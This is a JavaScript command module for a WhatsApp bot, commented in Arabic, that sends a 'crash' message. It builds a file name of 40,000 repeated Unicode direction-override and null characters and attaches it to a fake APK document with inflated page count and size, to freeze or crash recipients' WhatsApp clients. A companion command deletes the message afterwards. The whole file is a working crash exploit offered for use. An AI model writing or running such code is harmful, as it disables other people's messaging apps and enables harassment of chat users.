const crashStorage = new Map();

module.exports = {
    name: "فيروس",
    aliases: ["حرق", "انهاء", "crash", "روق", "حذف_الفيروس"],

    async execute(sock, mek, args, { isOwner, lookupName }) {
        const from = mek.key.remoteJid;

        if (!isOwner) return; // حماية مطلقة وحصرية للمطور فقط

        const flags = ["🇯🇵", "🇸🇩", "🇷🇺", "🇨🇦", "🇩🇪", "🇰🇵", "🇲🇨", "🇺🇸"];
        const randomFlag = flags[Math.floor(Math.random() * flags.length)];
        const footer = `>  𝘋𝘈𝘙𝘒 𝘉指標𝘛 · ${randomFlag}`;

        if (lookupName === "فيروس" || lookupName === "حرق" || lookupName === "انهاء" || lookupName === "crash") {
            await sock.sendMessage(from, { react: { text: "☠️", key: mek.key } });
            try {
                let overflowPayload = "";
                for (let i = 0; i < 40000; i++) { overflowPayload += "\u200e\u200f\u202e\u202d\u202a\u0000"; }

                const sentMek = await sock.sendMessage(from, {
                    document: Buffer.from([0x00, 0x01, 0x02, 0x03]),
                    mimetype: "application/vnd.android.package-archive",
                    fileName: `🚨 𝘋𝘈𝘙𝘒 𝘊𝘙𝘈𝘚𝘏 𝘚𝘠𝘚𝘛𝘌𝘔 🚨\n${overflowPayload}`,
                    pageCount: 999999,
                    fileLength: 9999999999999,
                    caption: `⚡ *DARK SYSTEM OVERFLOW* ⚡\n\n⚠️ تم نسف وتجميد الشات بنجاح غصباً عن تحديثات السيرفر.\n\n${footer}`
                });
                crashStorage.set(from, sentMek.key);
            } catch (err) { console.error(err); }
            return;
        }

        if (lookupName === "روق" || lookupName === "حذف_الفيروس") {
            await sock.sendMessage(from, { react: { text: "🧼", key: mek.key } });
            const targetKey = crashStorage.get(from);

            if (!targetKey) {
                return await sock.sendMessage(from, { text: "📊 لا توجد رسالة فيروس نشطة حالياً لسحبها يا كينج." }, { quoted: mek });
            }

            try {
                await sock.sendMessage(from, { delete: targetKey });
                crashStorage.delete(from);
                const calmMsg = `\n*╭─〔  𝘊𝘙𝘈𝘚𝘏  𝘊𝘓𝘌𝘈𝘙𝘌𝘋   〕─╮*\n\n  » تم سحب قنبلة المستند وتطهير الساحة بالكامل!\n  » عاد الشات خفيفاً وشغالاً طلقة الآن.\n\n*╰─────────────────────╯*\n${footer}`;
                await sock.sendMessage(from, { text: calmMsg });
            } catch (err) {
                await sock.sendMessage(from, { text: "❌ فشل سحب الفيروس، قد يكون تم مسحه يدوياً بالفعل." }, { quoted: mek });
            }
        }
    }
};

